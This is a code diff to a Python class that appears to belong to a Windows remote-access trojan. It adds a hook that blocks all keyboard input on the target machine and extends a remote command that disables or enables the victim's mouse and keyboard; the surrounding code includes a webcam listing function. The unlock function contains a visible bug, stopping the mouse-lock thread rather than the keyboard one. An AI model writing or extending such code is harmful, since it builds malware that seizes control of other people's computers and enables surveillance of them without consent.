@@ -596,6 +596,8 @@ class Information_Gathering:
 				hook.HookMouse()
 				pythoncom.PumpMessages()
 				
+			hook.UnhookMouse()
+				
 		t = StoppableThread(target=pumper)
 		t.daemon = True
 		t.start()	
@@ -607,16 +609,51 @@ class Information_Gathering:
 		win32api.PostThreadMessage(self.mouselock.ident, win32con.WM_QUIT, 0, 0)
 		
 	@windows_only
+	def lock_keyboard(self):
+		def DENIED(event): return False
+		
+		def pumper():
+			ct = threading.currentThread()
+			while not ct.stopped():
+				hook = pyHook.HookManager()
+				hook.KeyDown = DENIED
+				hook.HookKeyboard()
+				pythoncom.PumpMessages()
+				
+			hook.UnhookKeyboard()
+				
+		t = StoppableThread(target=pumper)
+		t.daemon = True
+		t.start()	
+
+		self.keylock = t
+		
+	def unlock_keyboard(self):
+		self.mouselock.stop()
+		win32api.PostThreadMessage(self.keylock.ident, win32con.WM_QUIT, 0, 0)
+		
+	@windows_only
 	def uictl(self, action, what):
-		if action == "lock":
+		what = what.lower()
+		action = action.lower()
+		if what not in ["keyboard","mouse"]: return "[-]Unknown object: "+what
+		if action == "disable":
 			if what == "mouse":
 				self.lock_mouse()
+			elif what == "keyboard":
+				self.lock_keyboard()
+
 				
-		elif action == "unlock":
+		elif action == "enable":
 			if what == "mouse":
 				self.unlock_mouse()
+			elif what == "keyboard":
+				self.unlock_keyboard()
 				
-		return "k"
+		else:
+			return "[-]Unknown action: "+action
+				
+		return "[+]"+what.capitalize()+" "+action+"d."
 		
 	@windows_only
 	def webcam_list(self):
